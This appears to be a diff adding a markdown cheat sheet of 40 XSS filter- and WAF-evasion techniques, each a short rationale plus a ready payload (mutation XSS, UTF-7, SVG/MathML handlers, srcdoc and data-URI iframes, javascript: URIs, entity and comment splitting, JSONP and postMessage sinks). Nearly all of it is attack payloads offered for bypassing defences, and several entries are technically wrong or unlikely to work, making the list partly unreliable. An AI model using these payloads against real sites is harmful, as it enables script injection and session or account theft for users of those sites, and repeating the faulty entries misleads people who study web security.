@@ -1,0 +1,323 @@
+1. **mXSS via inert HTML reactivation**
+
+   - Insert inert markup that becomes active after DOM mutation (sanitizers miss it).
+   - Example:
+     ```
+     <template id=t><img src=x onerror=alert(1)></template><script>document.body.appendChild(t.content)</script>
+     ```
+
+2. **DOM clobbering to hijack flow**
+
+   - Shadow critical globals/props by injecting elements with conflicting IDs/names.
+   - Example:
+     ```
+     <form id=submit onsubmit=alert(1)></form>
+     ```
+
+3. **Surrogate-pair script break (HTML-in-JS)**
+
+   - Break </script> with Unicode pairs; browser rejoins at parse time.
+   - Example:
+     ```
+     </scr\u0069pt><script>alert(1)</script>
+     ```
+
+4. **UTF‑7 charset switch**
+
+   - Force legacy decoder to reinterpret bytes as tags.
+   - Example:
+     ```
+     <meta charset="UTF-7">+ADw-script+AD4-alert(1)+ADw-/script+AD4-
+     ```
+
+5. **SVG SMIL onbegin chain**
+
+   - Avoid onload/onerror signatures; trigger via animation lifecycle.
+   - Example:
+     ```
+     <svg><animate attributeName="x" dur="1s" onbegin="alert(1)"></svg>
+     ```
+
+6. **MathML action pivot**
+
+   - Use MathML handlers less covered by filters.
+   - Example:
+     ```
+     <math><maction actiontype="statusline#javascript:alert(1)"></maction></math>
+     ```
+
+7. **Base href trap (relative → javascript)**
+
+   - Rewrite resolution context to execute link clicks.
+   - Example:
+     ```
+     <base href="javascript:alert(1)//"><a href="#">go</a>
+     ```
+
+8. **Srcdoc iframe injection**
+
+   - Many WAFs inspect src, not srcdoc.
+   - Example:
+     ```
+     <iframe srcdoc="<script>alert(1)</script>">
+     ```
+
+9. **Srcset data/html pivot**
+
+   - Hide HTML in image candidate; browsers parse chosen candidate.
+   - Example:
+     ```
+     <img srcset="data:text/html,<script>alert(1)</script> 1x">
+     ```
+
+10. **ForeignObject HTML in SVG**
+
+    - Nest executable HTML where HTML‑parsers don’t look.
+    - Example:
+      ```
+      <svg><foreignObject><body><script>alert(1)</script></body></foreignObject></svg>
+      ```
+
+11. **Event alias + partial entity split**
+
+    - Break the event token across entities; browser recombines.
+    - Example:
+      ```
+      <img src=x onerr&#x6f;r=alert(1)>
+      ```
+
+12. **HTML comment stitching**
+
+    - Split sensitive token with comments; regex misses it.
+    - Example:
+      ```
+      <svg/on<!-- -->load=alert(1)>
+      ```
+
+13. **Obscure named entities as separators**
+
+    - Use &Tab;/&NewLine; to evade simple token patterns.
+    - Example:
+      ```
+      <img&Tab;src=x&NewLine;onerror=alert(1)>
+      ```
+
+14. **Attribute order inversion**
+
+    - Signature expects src before handler; invert it.
+    - Example:
+      ```
+      <img onerror=alert(1) src=x>
+      ```
+
+15. **Data URI with base64 HTML**
+
+    - Cloud WAF sees “data:text/html”; browser executes decoded script.
+    - Example:
+      ```
+      <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+      ```
+
+16. **JSON → innerHTML (HTML-in-JSON)**
+
+    - Payload travels as JSON, executes at DOM sink.
+    - Example:
+      ```
+      {"name":"<img src=x onerror=alert(1)>"}
+      ```
+
+17. **Markdown → HTML (media scheme)**
+
+    - Parser transforms safe‑looking text into JS URI.
+    - Example:
+      ```
+      ![x](javascript:alert(1))
+      ```
+
+18. **BBCode → HTML event**
+
+    - Post‑filter transforms reintroduce executable attributes.
+    - Example:
+      ```
+      [img]x" onerror="alert(1)[/img]
+      ```
+
+19. **Meta refresh to javascript**
+
+    - Redirect executes without obvious script tags.
+    - Example:
+      ```
+      <meta http-equiv="refresh" content="0;javascript:alert(1)">
+      ```
+
+20. **Noscript mutation XSS**
+
+    - Inert noscript becomes active after JS toggles state.
+    - Example:
+      ```
+      <noscript><p title="</noscript><img src=x onerror=alert(1)>"></p>
+      ```
+
+21. **Template literal break (JS context)**
+
+    - Break out of backtick string cleanly.
+    - Example:
+      ```
+      ${alert(1)}
+      ```
+
+22. **Trusted Types policy abuse**
+
+    - Over‑permissive TT policy creates executable HTML.
+    - Example:
+      ```
+      <script>
+        trustedTypes.createPolicy('p',{createHTML: _=>'<img src=x onerror=alert(1)>'});
+        el.innerHTML = p.createHTML('x');
+      </script>
+      ```
+
+23. **JSONP callback injection**
+
+    - Callback name becomes code path.
+    - Example:
+      ```
+      ?callback=alert
+      ```
+
+24. **PostMessage → innerHTML chain**
+
+    - Cross‑frame message dropped into dangerous sink.
+    - Example:
+      ```
+      // child
+      parent.postMessage('<img src=x onerror=alert(1)>','*')
+      // parent (vuln): window.onmessage=e=>document.body.innerHTML=e.data
+      ```
+
+25. **Graph embedders with lax sanitization**
+
+    - Third‑party widget re‑renders user strings as HTML.
+    - Example:
+      ```
+      <div data-graph='{"title":"<img src=x onerror=alert(1)>"}'></div>
+      ```
+
+26. **Inline event via encoded quote escape**
+
+    - Break attribute quoting with encoded splitter.
+    - Example:
+      ```
+      " autofocus onfocus=alert(1) x="
+      ```
+
+27. **Overlong UTF‑8 for tokens**
+
+    - Legacy/glitchy decoders miss overlong encodings.
+    - Example:
+      ```
+      %C0%AEonload%3Dalert(1)
+      ```
+
+28. **Split `</script>` across HTML/JS boundaries**
+
+    - Confuse server‑side sanitizer; browser rejoins.
+    - Example:
+      ```
+      <script>/*</scri*/pt>alert(1)</script>
+      ```
+
+29. **Inline style URL to javascript (legacy)**
+
+    - Style attribute becomes JS via url().
+    - Example:
+      ```
+      <div style="background-image:url(javascript:alert(1))">
+      ```
+
+30. **Foreign protocol pivot in form action**
+
+    - Non‑HTTP scheme executed by browser.
+    - Example:
+      ```
+      <form action="javascript:alert(1)"><input type=submit>
+      ```
+
+31. **Srcdoc + sandbox carve‑out**
+
+    - Sandbox still allows scripts; edge ignores srcdoc.
+    - Example:
+      ```
+      <iframe sandbox="allow-scripts" srcdoc="<script>alert(1)</script>">
+      ```
+
+32. **SVG `set` rewriting href to javascript**
+
+    - Animate attribute to a JS URI.
+    - Example:
+      ```
+      <svg><a id=a href="#"><text>go</text></a><set xlink:href="#a" attributeName="href" to="javascript:alert(1)"/></svg>
+      ```
+
+33. **`srcset` width descriptor confusion**
+
+    - Hide executable candidate among benign sizes.
+    - Example:
+      ```
+      <img src="x" srcset="x 1w, data:text/html,<script>alert(1)</script> 2w" sizes="2w">
+      ```
+
+34. **Entity‑broken attribute name**
+
+    - Split attribute token so filter misses it.
+    - Example:
+      ```
+      <svg onlo&#x61;d=alert(1)>
+      ```
+
+35. **Case‑mismatched tag/attr exploiting HTML parser**
+
+    - Mixed case slips past case‑sensitive checks.
+    - Example:
+      ```
+      <SvG oNlOaD=alert(1)>
+      ```
+
+36. **Comment‑nested tag trick**
+
+    - Hide script in comment seam that later gets concatenated.
+    - Example:
+      ```
+      <!--"><script>alert(1)</script>--><div>
+      ```
+
+37. **URL‑encoded within HTML entity (double decode)**
+
+    - Layered encodings recombine only at the end.
+    - Example:
+      ```
+      &amp;#x3C;img%20src%3Dx%20onerror%3Dalert(1)&amp;#x3E;
+      ```
+
+38. **Hidden control separators**
+
+    - Use zero‑width/non‑joiners to split tokens.
+    - Example:
+      ```
+      <img src=x on​error=alert(1)>
+      ```
+
+39. **Line‑ending confusions (CR vs LF)**
+
+    - Certain parsers normalize differently; browser accepts.
+    - Example:
+      ```
+      <svg/onload=alert(1)\r\n>
+      ```
+
+40. **Polyglot comment/script/HTML stitch**
+    - Valid across multiple parsers; executes after final assembly.
+    - Example:
+      ```
+      --><script>alert(1)</script>
+      ```
